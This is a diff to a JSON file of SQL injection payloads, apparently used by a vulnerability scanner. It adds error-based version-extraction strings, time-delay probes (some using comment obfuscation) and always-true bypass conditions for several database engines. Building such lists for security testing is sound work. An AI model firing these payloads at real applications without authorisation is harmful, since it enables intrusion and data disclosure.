@@ -1,22 +1,238 @@
 {
   "error_based": [
     {
-      "payload": "' AND 1=CONVERT(int,(SELECT @@version)) --",
+      "payload": "' UNION SELECT NULL-- -",
+      "description": "Generic error-based test"
+    },
+    {
+      "payload": "' ORDER BY -1-- -",
+      "description": "Generic ORDER BY error"
+    },
+    {
+      "payload": "' AND updatexml(NULL, concat(char(126),version()), char(126))-- -",
+      "dbms": "mysql",
+      "description": "MySQL UpdateXML function"
+    },
+    {
+      "payload": "' AND extractvalue(rand(),concat(char(126),version(),char(126)))-- -",
+      "dbms": "mysql",
+      "description": "MySQL Extractvalue function (>= 5.1)"
+    },
+    {
+      "payload": "' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- -",
+      "dbms": "mysql",
+      "description": "MySQL NAME_CONST function (>= 5.0)"
+    },
+    {
+      "payload": "' AND cast(version() as integer) > 0-- -",
+      "dbms": "postgresql",
+      "description": "PostgreSQL version extraction"
+    },
+    {
+      "payload": "' AND 1=cast(chr(126)||version()||chr(126) AS NUMERIC)-- -",
+      "dbms": "postgresql",
+      "description": "PostgreSQL version extraction"
+    },
+    {
+      "payload": "' UNION SELECT sqlite_version()-- -",
+      "dbms": "sqlite",
+      "description": "SQLite version extraction"
+    },
+    {
+      "payload": "' AND 1=convert(int,@@version)-- -",
       "dbms": "mssql",
-      "description": "MSSQL version disclosure"
+      "description": "MSSQL version extraction"
+    },
+    {
+      "payload": "' AND 1=cast((SELECT @@version) as int)-- -",
+      "dbms": "mssql",
+      "description": "MSSQL version extraction"
+    },
+    {
+      "payload": "' + convert(int,@@version) + '",
+      "dbms": "mssql",
+      "description": "MSSQL version extraction"
+    },
+    {
+      "payload": "' UNION SELECT NULL FROM DUAL-- -",
+      "dbms": "oracle",
+      "description": "Oracle UNION-based error test"
     }
   ],
   "time_based": [
     {
-      "payload": "' AND SLEEP(5) --",
+      "payload": "' or sleep(5) -- -",
       "dbms": "mysql",
-      "description": "MySQL time-based test"
+      "description": "MySQL sleep-based delay"
+    },
+    {
+      "payload": "\" or sleep(5) -- -",
+      "dbms": "mysql",
+      "description": "MySQL sleep-based delay (double quotes)"
+    },
+    {
+      "payload": "/**/or/**/sleep(5)/**/--/**/-",
+      "dbms": "mysql",
+      "description": "MySQL sleep-based delay with comment obfuscation"
+    },
+    {
+      "payload": "'/**/or/**/sleep(5)/**/--/**/-",
+      "dbms": "mysql",
+      "description": "MySQL sleep-based delay with comment obfuscation (single quotes)"
+    },
+    {
+      "payload": "\"/**/or/**/sleep(5)/**/--/**/-",
+      "dbms": "mysql",
+      "description": "MySQL sleep-based delay with comment obfuscation (double quotes)"
+    },
+    {
+      "payload": "' AND 1337=BENCHMARK(50000000,SHA1(1337))-- -",
+      "dbms": "mysql",
+      "description": "MySQL heavy computation benchmark test"
+    },
+    {
+      "payload": "' XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR",
+      "dbms": "mysql",
+      "description": "MySQL XOR-based inference delay"
+    },
+    {
+      "payload": "RLIKE SLEEP([SLEEPTIME])",
+      "dbms": "mysql",
+      "description": "MySQL regex-based sleep delay"
+    },
+    {
+      "payload": "OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))",
+      "dbms": "mysql",
+      "description": "MySQL ELT function-based delay"
+    },
+    {
+      "payload": "AND (SELECT 1337 FROM (SELECT(SLEEP(10-(IF((1=1),0,10))))) RANDSTR)",
+      "dbms": "mysql",
+      "description": "MySQL conditional sleep delay"
+    },
+    {
+      "payload": ";(select 1 from pg_sleep(5))",
+      "dbms": "postgresql",
+      "description": "PostgreSQL sleep-based delay"
+    },
+    {
+      "payload": "||(select 1 from pg_sleep(5))",
+      "dbms": "postgresql",
+      "description": "PostgreSQL sleep delay with concatenation"
+    },
+    {
+      "payload": "AND 'RANDSTR'||PG_SLEEP(5)='RANDSTR'",
+      "dbms": "postgresql",
+      "description": "PostgreSQL concatenation-based delay"
+    },
+    {
+      "payload": "AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP(5))",
+      "dbms": "postgresql",
+      "description": "PostgreSQL inference-based delay"
+    },
+    {
+      "payload": "AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000))",
+      "dbms": "postgresql",
+      "description": "PostgreSQL heavy computation delay"
+    },
+    {
+      "payload": "' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",
+      "dbms": "sqlite",
+      "description": "SQLite random blob-based delay"
+    },
+    {
+      "payload": "' AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
+      "dbms": "sqlite",
+      "description": "SQLite random blob-based heavy computation delay"
+    },
+    {
+      "payload": "1;waitfor delay '0:0:5'--",
+      "dbms": "mssql",
+      "description": "MSSQL WAITFOR DELAY-based time delay"
+    },
+    {
+      "payload": "1';waitfor delay '0:0:5'--",
+      "dbms": "mssql",
+      "description": "MSSQL WAITFOR DELAY-based time delay (single quotes)"
+    },
+    {
+      "payload": "1));waitfor delay '0:0:5'--",
+      "dbms": "mssql",
+      "description": "MSSQL WAITFOR DELAY with parentheses"
+    },
+    {
+      "payload": "IF([INFERENCE]) WAITFOR DELAY '0:0:5'",
+      "dbms": "mssql",
+      "description": "MSSQL inference-based delay"
+    },
+    {
+      "payload": "IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';",
+      "dbms": "mssql",
+      "description": "MSSQL conditional delay execution"
+    },
+    {
+      "payload": "' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',5)",
+      "dbms": "oracle",
+      "description": "Oracle DBMS_PIPE-based delay"
+    },
+    {
+      "payload": "' AND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) ELSE 1337 END)",
+      "dbms": "oracle",
+      "description": "Oracle conditional DBMS_PIPE delay"
     }
   ],
   "boolean_based": [
     {
-      "payload": "' AND 1=1 --",
-      "description": "Boolean-based test"
+      "payload": "1",
+      "description": "Normal Request test"
+    },
+    {
+      "payload": "or 1=1 -- -",
+      "description": "Always true condition"
+    },
+    {
+      "payload": "'); or 1=1 -- -",
+      "description": "Always true condition (single quote escape)"
+    },
+    {
+      "payload": "\" or 1=1 -- -",
+      "description": "Always true condition (double quote escape)"
+    },
+    {
+      "payload": "' AND 1=1--",
+      "description": "True comparison"
+    },
+    {
+      "payload": "' OR 1=1--",
+      "description": "True comparison"
+    },
+    {
+      "payload": "'OR'+1+'OR'+1=1",
+      "description": "True comparison (no quotes required)"
+    },
+    {
+      "payload": "-1 OR 1=1",
+      "description": "True numeric comparison"
+    },
+    {
+      "payload": "' AND MAKE_SET(1=1,1)--",
+      "dbms": "mysql",
+      "description": "MySQL specific - Always true (returns 1)"
+    },
+    {
+      "payload": "' AND ELT(1=1,1)--",
+      "dbms": "mysql",
+      "description": "MySQL specific - Always true (returns 1)"
+    },
+    {
+      "payload": "' OR (SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END) = 'true'--",
+      "dbms": "mssql",
+      "description": "MSSQL specific - Always true conditional check"
+    },
+    {
+      "payload": "' AND IIF(1=1,1,0)--",
+      "dbms": "msaccess",
+      "description": "MS Access specific - Always true (returns 1)"
     }
   ]
-} 
+}
